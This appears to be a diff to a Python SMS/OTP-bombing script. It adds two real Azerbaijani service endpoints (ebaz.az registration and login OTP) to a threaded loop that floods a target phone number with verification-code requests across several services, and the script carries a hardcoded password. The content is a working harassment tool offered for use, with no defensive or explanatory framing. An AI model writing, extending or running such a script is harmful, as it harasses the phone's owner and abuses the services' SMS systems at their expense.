@@ -82,6 +82,8 @@ def main():
     pro_phone = f"994{phone_number}"
     mpayr_phone = f"+994{phone_number}"
     mpay_phone = f"+994{phone_number}"
+    baz_phone = f"+994{phone_number}"
+    bazr_phone = f"+994{phone_number}"
 
     umico_url = "https://customer.umico.az/v2/clients/account/sign-up"
     umico_headers = {
@@ -171,6 +173,24 @@ def main():
         "username": mpay_phone,
         "password":"DjgkJf?!74y72?xS"
     }
+    
+    baz_url = "https://api.ebaz.az/registrationSendOTP"
+    baz_headers = {
+        'Host': 'api.ebaz.az',
+        'Content-Type': 'application/json'
+    }
+    baz_data = {
+        "mobileNum": baz_phone
+    }
+    
+    bazr_url = "https://api.ebaz.az/loginSendOTP"
+    bazr_headers = {
+        'Host': 'api.ebaz.az',
+        'Content-Type': 'application/json'
+    }
+    bazr_data = {
+        "mobileNum": bazr_phone
+    }
 
     failed_requests = []
 
@@ -187,6 +207,8 @@ def main():
             pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, i+1, requests_per_thread + 1, failed_requests))
             mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, i+1, requests_per_thread + 1, failed_requests))
             mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, i+1, requests_per_thread + 1, failed_requests))
+            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, i+1, requests_per_thread + 1, failed_requests))
+            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, i+1, requests_per_thread + 1, failed_requests))
         else:
             umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, i+1, requests_per_thread, failed_requests))
             umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, i+1, requests_per_thread, failed_requests))
@@ -197,6 +219,8 @@ def main():
             pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, i+1, requests_per_thread, failed_requests))
             mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, i+1, requests_per_thread, failed_requests))
             mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, i+1, requests_per_thread, failed_requests))
+            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, i+1, requests_per_thread, failed_requests))
+            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, i+1, requests_per_thread, failed_requests))
         
         thread_list.append(umico_thread)
         thread_list.append(umireg_thread)
@@ -207,6 +231,8 @@ def main():
         thread_list.append(pro_thread)
         thread_list.append(mpayr_thread)
         thread_list.append(mpay_thread)
+        thread_list.append(baz_thread)
+        thread_list.append(bazr_thread)
         umico_thread.start()
         umireg_thread.start()
         million_thread.start()
@@ -216,6 +242,8 @@ def main():
         pro_thread.start()
         mpayr_thread.start()
         mpay_thread.start()
+        baz_thread.start()
+        bazr_thread.start()
 
     for thread in thread_list:
         thread.join()
